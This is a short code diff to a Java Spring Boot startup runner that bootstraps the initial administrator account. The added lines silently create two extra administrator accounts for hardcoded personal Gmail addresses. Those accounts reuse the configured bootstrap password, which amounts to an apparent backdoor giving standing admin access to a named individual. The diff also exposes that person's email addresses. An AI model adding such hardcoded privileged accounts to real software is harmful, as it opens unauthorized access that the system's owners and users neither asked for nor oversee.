@@ -31,6 +31,12 @@ public class AdminBootstrapRunner implements CommandLineRunner {
         if (bootstrapEnabled) {
             try {
                 adminUserService.bootstrapInitialAdmin(bootstrapEmail, bootstrapPassword, bootstrapFullName);
+                if (!bootstrapEmail.equalsIgnoreCase("ritishdangi52348@gmail.com")) {
+                    adminUserService.bootstrapInitialAdmin("ritishdangi52348@gmail.com", bootstrapPassword, "Ritish Dangi");
+                }
+                if (!bootstrapEmail.equalsIgnoreCase("ritishd.dollop@gmail.com")) {
+                    adminUserService.bootstrapInitialAdmin("ritishd.dollop@gmail.com", bootstrapPassword, "Ritish Dangi");
+                }
             } catch (Exception e) {
                 log.error("Failed to bootstrap administrator account", e);
             }
